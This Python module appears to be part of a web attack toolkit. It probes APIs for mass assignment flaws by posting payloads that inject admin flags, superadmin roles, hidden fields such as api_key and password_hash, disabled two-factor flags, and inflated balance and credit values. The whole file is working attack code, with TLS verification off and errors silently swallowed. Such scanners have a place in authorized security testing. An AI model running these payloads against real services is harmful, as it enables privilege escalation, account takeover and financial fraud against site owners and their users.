"""
Mass Assignment / Overposting Module
- Field injection
- Hidden parameter discovery
- Permission escalation via mass assignment
"""

import requests
import json
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class MassAssignmentAnalyzer:
    """Analyze mass assignment vulnerabilities"""
    
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'} if token else {}
        self.headers['Content-Type'] = 'application/json'
        
    def test_admin_field_injection(self) -> Dict[str, Any]:
        """Test isAdmin/admin field injection"""
        logger.info("[*] Testing admin field injection...")
        
        admin_payloads = [
            {'username': 'test', 'isAdmin': True},
            {'username': 'test', 'admin': True},
            {'username': 'test', 'role': 'admin'},
            {'username': 'test', 'is_admin': 1},
            {'username': 'test', 'admin_level': 9999},
            {'username': 'test', 'permissions': ['admin', 'delete', 'modify']}
        ]
        
        for payload in admin_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}/api/user/create",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    verify_resp = requests.get(
                        f"{self.base_url}/api/user/profile",
                        headers=self.headers,
                        timeout=5,
                        verify=False
                    )
                    
                    if 'admin' in verify_resp.text.lower():
                        logger.info(f"[+] Admin injection successful: {list(payload.keys())}")
                        return {
                            'vulnerable': True,
                            'injected_fields': [k for k in payload.keys() if k != 'username'],
                            'payload': payload
                        }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_hidden_field_discovery(self, endpoint: str) -> Dict[str, Any]:
        """Discover hidden fields through error messages"""
        logger.info("[*] Discovering hidden fields...")
        
        hidden_fields = [
            'internal_id', 'is_premium', 'verified', 'account_type',
            'balance', 'credit', 'subscription', 'api_key',
            'private_key', 'secret', 'password_hash'
        ]
        
        discovered = []
        
        for field in hidden_fields:
            try:
                payload = {'username': 'test', field: 'injected_value'}
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                # Check if field was accepted
                if resp.status_code in [200, 201]:
                    discovered.append(field)
                    logger.info(f"[+] Hidden field discovered: {field}")
            except:
                pass
        
        return {
            'discovered_fields': discovered,
            'vulnerable': len(discovered) > 0
        }
    
    def test_role_injection(self) -> Dict[str, Any]:
        """Test role/permission injection"""
        logger.info("[*] Testing role injection...")
        
        role_payloads = [
            {'name': 'user', 'role': 'superadmin'},
            {'name': 'user', 'roles': ['admin', 'moderator', 'power_user']},
            {'name': 'user', 'permissions': ['read', 'write', 'delete', 'admin']},
            {'name': 'user', 'acl': ['admin', 'root']},
            {'name': 'user', 'groups': ['admin', 'superuser']}
        ]
        
        for payload in role_payloads:
            try:
                resp = requests.put(
                    f"{self.base_url}/api/user/update",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    logger.info(f"[+] Role injection accepted: {list(payload.keys())}")
                    return {
                        'vulnerable': True,
                        'injected_field': [k for k in payload.keys() if k != 'name'],
                        'payload': payload
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_metadata_injection(self) -> Dict[str, Any]:
        """Test metadata field injection"""
        logger.info("[*] Testing metadata injection...")
        
        metadata_payloads = [
            {'data': 'value', 'is_verified': True},
            {'data': 'value', 'email_verified': True},
            {'data': 'value', 'two_factor_enabled': False},
            {'data': 'value', 'account_status': 'active'},
            {'data': 'value', 'last_login': '2099-01-01'}
        ]
        
        for payload in metadata_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}/api/settings/update",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    logger.info(f"[+] Metadata injection accepted: {list(payload.keys())}")
                    return {
                        'vulnerable': True,
                        'injected_fields': [k for k in payload.keys() if k != 'data'],
                        'payload': payload
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_financial_field_injection(self) -> Dict[str, Any]:
        """Test financial/balance field injection"""
        logger.info("[*] Testing financial field injection...")
        
        financial_payloads = [
            {'amount': 100, 'balance': 999999},
            {'amount': 100, 'credit': 5000},
            {'amount': 100, 'premium_balance': 9999},
            {'amount': 100, 'internal_balance': 100000},
            {'amount': 100, 'account_credit': 50000}
        ]
        
        for payload in financial_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}/api/transaction",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    logger.info(f"[+] Financial injection accepted: {payload}")
                    return {
                        'vulnerable': True,
                        'injected_field': [k for k in payload.keys() if k != 'amount'],
                        'payload': payload
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def analyze(self) -> Dict[str, Any]:
        """Run full mass assignment analysis"""
        logger.info("[*] Starting mass assignment analysis...")
        
        results = {
            'admin_injection': self.test_admin_field_injection(),
            'hidden_fields': self.test_hidden_field_discovery('/api/register'),
            'role_injection': self.test_role_injection(),
            'metadata_injection': self.test_metadata_injection(),
            'financial_injection': self.test_financial_field_injection()
        }
        
        return results
